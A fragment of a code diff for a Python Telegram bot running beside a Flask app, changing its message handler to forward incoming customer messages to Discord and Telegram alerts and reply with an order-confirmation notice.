-                f"Text: {text}"
-            )
-            bot.send_message(
-                uid,
-                f"Thanks for reaching out! 🙌\n\n"
-                f"Use /start to see all services, or visit:\n{SITE_URL}",
-                reply_markup=build_main_menu()
-            )
+            uid = m.from_user.id
+            username = m.from_user.username or "N/A"
 
-        bot.polling(none_stop=True, interval=1, timeout=30)
+            notify_discord_alert(
+                "📨 BOT MESSAGE RECEIVED",
+                {"From": str(uid), "Username": f"@{username}", "Message": text[:500]},
+                color=0x3b82f6
+            )
+            notify_telegram(f"*BOT MESSAGE*\nFrom: {uid} (@{username})\n`{text[:300]}`")
+
+            bot.send_message(m.chat.id,
+                "Thank you! Our team has been notified and will confirm your order shortly.\n\nReturn to the main menu:",
+                reply_markup=build_main_menu())
+
+        bot.polling(none_stop=True, timeout=30)
     except Exception as e:
-        print(f"Bot error: {e}")
+        time.sleep(5)
 
 
 if __name__ == "__main__":
     if bot:
         t = threading.Thread(target=run_bot, daemon=True)
         t.start()
-        print("Bot polling started")
-
-    app.run(host="0.0.0.0", port=int(os.environ.get("API_PORT", 8000)), debug=False)
+    app.run(host="0.0.0.0", port=8000, debug=False, use_reloader=False)
